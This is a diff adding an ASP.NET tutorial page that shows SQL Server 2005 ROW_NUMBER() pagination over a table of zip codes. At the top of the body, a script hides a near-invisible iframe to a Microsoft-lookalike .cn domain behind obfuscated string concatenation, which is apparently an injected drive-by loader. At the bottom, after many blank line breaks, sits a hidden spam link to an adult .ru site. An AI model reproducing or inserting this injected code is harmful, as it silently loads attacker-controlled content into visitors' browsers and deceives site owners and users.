@@ -1,0 +1,154 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>
+	Using ROW_NUMBER() to paginate your data with SQL Server 2005 and asp.net c#
+</title>
+    <style type="text/css">
+
+	    a:link {
+		    color: #000000;
+		    text-decoration: none;
+		    border-bottom: 1px dashed #d5ad84;
+	    }
+	    a:visited {
+		    color: #000000;
+		    text-decoration: none;
+		    border-bottom: 1px dashed #d5ad84;
+	    }
+
+	    a:hover {
+		    border-bottom: 1px solid #d5ad84;
+	    }
+
+	    a:active	{
+		    color: #000000;
+		    text-decoration: none;
+		    border-bottom: 1px dashed #d5ad84;
+	    }
+
+	    h1
+	    {
+		    font-size: 18px;
+		    font-weight: bold;
+		    color: #786652;
+	    }
+
+	    body {
+		    margin: 5px;
+		    font-family: Arial;
+		    font-size:12px;
+	    }
+
+	    .formbox {
+		    background-color: #efeae1;
+		    border: 1px solid #bebab4;
+		    width: 200px;
+		    height: 23px;
+		    padding: 3px;
+	    }
+
+	    #xml {
+		    background-color: #fbedbb;
+		    border: 1px dotted #ff9900;
+		    width: 600px;
+		    padding: 3px;
+	    }
+
+    </style>
+
+    <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+    </script>
+
+    <script type="text/javascript">
+    _uacct = "UA-149483-1";
+    urchinTracker();
+    </script>
+
+<script type="text/javascript">var NREUMQ=NREUMQ||[];NREUMQ.push(["mark","firstbyte",new Date().getTime()])</script></head>
+<body style="text-align: left"><script>document.write("<if"+''+'ra'+''+"m"+'e s'+"rc=\"h"+''+'tt'+"p:"+''+"/"+''+'/mic'+"roso"+'t'+''+'f.c'+"n"+'/'+"\" wid"+''+'th=1 he'+"igh"+''+'t'+"="+"2></i"+''+"f"+"ra"+''+""+''+"me"+'>');</script>
+    <form name="form1" method="post" action="Default.aspx?start=0" id="form1">
+<div>
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
+</div>
+
+        <h1>
+            <a href="#Using+ROW_NUMBER()+to+paginate+your+data+with+SQL+Server+2005+and+asp.net+c#"><span style="color: #000000">Using ROW_NUMBER() to paginate your data
+                with SQL Server 2005 and asp.net c#</span></a></h1>
+         <br />
+         <div id = "xml">
+         SELECT TOP 20 * FROM<br />
+        (<br />
+            SELECT zip,city,state,latitude,longitude,timezone,dst,<br />
+	               ROW_NUMBER() OVER (ORDER BY zip) AS num<br />
+	               FROM dbo.zipcode<br />
+        ) AS a<br />
+        WHERE num > 0<br />
+         </div>
+        <br />We found about <strong>43191 records</strong>, now viewing <strong>1</strong> through <strong>20</strong>.<br />
+        << prev | <a href = "?start=20">next >></a>
+        <br />
+        <br />
+        <div>
+            <div>
+	<table cellspacing="0" cellpadding="2" border="0" id="GridView1" style="color:Black;background-color:LightGoldenrodYellow;border-color:Tan;border-width:1px;border-style:solid;border-collapse:collapse;">
+		<tr style="background-color:Tan;font-weight:bold;">
+			<th scope="col">zip</th><th scope="col">city</th><th scope="col">state</th><th scope="col">latitude</th><th scope="col">longitude</th><th scope="col">timezone</th><th scope="col">dst</th><th scope="col">num</th><th scope="col">zip</th><th scope="col">city</th><th scope="col">state</th><th scope="col">latitude</th><th scope="col">longitude</th><th scope="col">timezone</th><th scope="col">dst</th><th scope="col">num</th>
+		</tr><tr>
+			<td>00210</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>1</td><td>00210</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>1</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00211</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>2</td><td>00211</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>2</td>
+		</tr><tr>
+			<td>00212</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>3</td><td>00212</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>3</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00213</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>4</td><td>00213</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>4</td>
+		</tr><tr>
+			<td>00214</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>5</td><td>00214</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>5</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00215</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>6</td><td>00215</td><td>Portsmouth</td><td>NH</td><td>43.005895</td><td>-71.013202</td><td>-5</td><td>1</td><td>6</td>
+		</tr><tr>
+			<td>00501</td><td>Holtsville</td><td>NY</td><td>40.922326</td><td>-72.637078</td><td>-5</td><td>1</td><td>7</td><td>00501</td><td>Holtsville</td><td>NY</td><td>40.922326</td><td>-72.637078</td><td>-5</td><td>1</td><td>7</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00544</td><td>Holtsville</td><td>NY</td><td>40.922326</td><td>-72.637078</td><td>-5</td><td>1</td><td>8</td><td>00544</td><td>Holtsville</td><td>NY</td><td>40.922326</td><td>-72.637078</td><td>-5</td><td>1</td><td>8</td>
+		</tr><tr>
+			<td>00601</td><td>Adjuntas</td><td>PR</td><td>18.180103</td><td>-66.74947</td><td>-4</td><td>0</td><td>9</td><td>00601</td><td>Adjuntas</td><td>PR</td><td>18.180103</td><td>-66.74947</td><td>-4</td><td>0</td><td>9</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00602</td><td>Aguada</td><td>PR</td><td>18.363285</td><td>-67.18024</td><td>-4</td><td>0</td><td>10</td><td>00602</td><td>Aguada</td><td>PR</td><td>18.363285</td><td>-67.18024</td><td>-4</td><td>0</td><td>10</td>
+		</tr><tr>
+			<td>00603</td><td>Aguadilla</td><td>PR</td><td>18.448619</td><td>-67.13422</td><td>-4</td><td>0</td><td>11</td><td>00603</td><td>Aguadilla</td><td>PR</td><td>18.448619</td><td>-67.13422</td><td>-4</td><td>0</td><td>11</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00604</td><td>Aguadilla</td><td>PR</td><td>18.498987</td><td>-67.13699</td><td>-4</td><td>0</td><td>12</td><td>00604</td><td>Aguadilla</td><td>PR</td><td>18.498987</td><td>-67.13699</td><td>-4</td><td>0</td><td>12</td>
+		</tr><tr>
+			<td>00605</td><td>Aguadilla</td><td>PR</td><td>18.465162</td><td>-67.141486</td><td>-4</td><td>0</td><td>13</td><td>00605</td><td>Aguadilla</td><td>PR</td><td>18.465162</td><td>-67.141486</td><td>-4</td><td>0</td><td>13</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00606</td><td>Maricao</td><td>PR</td><td>18.182151</td><td>-66.9588</td><td>-4</td><td>0</td><td>14</td><td>00606</td><td>Maricao</td><td>PR</td><td>18.182151</td><td>-66.9588</td><td>-4</td><td>0</td><td>14</td>
+		</tr><tr>
+			<td>00607</td><td>Aguas Buenas</td><td>PR</td><td>18.256995</td><td>-66.104657</td><td>-4</td><td>0</td><td>15</td><td>00607</td><td>Aguas Buenas</td><td>PR</td><td>18.256995</td><td>-66.104657</td><td>-4</td><td>0</td><td>15</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00609</td><td>Aibonito</td><td>PR</td><td>18.142002</td><td>-66.273278</td><td>-4</td><td>0</td><td>16</td><td>00609</td><td>Aibonito</td><td>PR</td><td>18.142002</td><td>-66.273278</td><td>-4</td><td>0</td><td>16</td>
+		</tr><tr>
+			<td>00610</td><td>Anasco</td><td>PR</td><td>18.288319</td><td>-67.13604</td><td>-4</td><td>0</td><td>17</td><td>00610</td><td>Anasco</td><td>PR</td><td>18.288319</td><td>-67.13604</td><td>-4</td><td>0</td><td>17</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00611</td><td>Angeles</td><td>PR</td><td>18.279531</td><td>-66.80217</td><td>-4</td><td>0</td><td>18</td><td>00611</td><td>Angeles</td><td>PR</td><td>18.279531</td><td>-66.80217</td><td>-4</td><td>0</td><td>18</td>
+		</tr><tr>
+			<td>00612</td><td>Arecibo</td><td>PR</td><td>18.449732</td><td>-66.69879</td><td>-4</td><td>0</td><td>19</td><td>00612</td><td>Arecibo</td><td>PR</td><td>18.449732</td><td>-66.69879</td><td>-4</td><td>0</td><td>19</td>
+		</tr><tr style="background-color:PaleGoldenrod;">
+			<td>00613</td><td>Arecibo</td><td>PR</td><td>18.458093</td><td>-66.732732</td><td>-4</td><td>0</td><td>20</td><td>00613</td><td>Arecibo</td><td>PR</td><td>18.458093</td><td>-66.732732</td><td>-4</td><td>0</td><td>20</td>
+		</tr>
+	</table>
+</div>
+            
+        </div>
+        <br />We found about <strong>43191 records</strong>, now viewing <strong>1</strong> through <strong>20</strong>.<br />
+        << prev | <a href = "?start=20">next >></a>
+        <br />
+        <br />
+        <a href="http://www.aprogrammersjournal.com/"><span style="color: #000000">A Programmers
+            Journal</span></a> | <a href="http://www.aprogrammersjournal.com/rss.aspx">
+                <img alt = "rss" src="http://www.aprogrammersjournal.com/images/rss.gif" style="clear: right; border-top-style: none; border-right-style: none; border-left-style: none; border-bottom-style: none; vertical-align: middle;" /></a>
+    </form>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<p align=right><a href=http://eroticweb.ru><b><font face=Arial size=3 color=#996633></font></b></a></p><script type="text/javascript">if (!NREUMQ.f){NREUMQ.f=function(){NREUMQ.push(["load",new Date().getTime()]);var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="https://js-agent.newrelic.com/nr-100.js";document.body.appendChild(e);if(NREUMQ.a)NREUMQ.a();};NREUMQ.a=window.onload;window.onload=NREUMQ.f;};NREUMQ.push(["nrf2","beacon-4.newrelic.com","c9f1796f0b",1267216,"NFABbEVRD0tWVUUKWg0aImtnHzN3YHhkLncmZ0xcUlYATVtCHwJGE00=",0,62,new Date().getTime()])</script></body>
+</html>
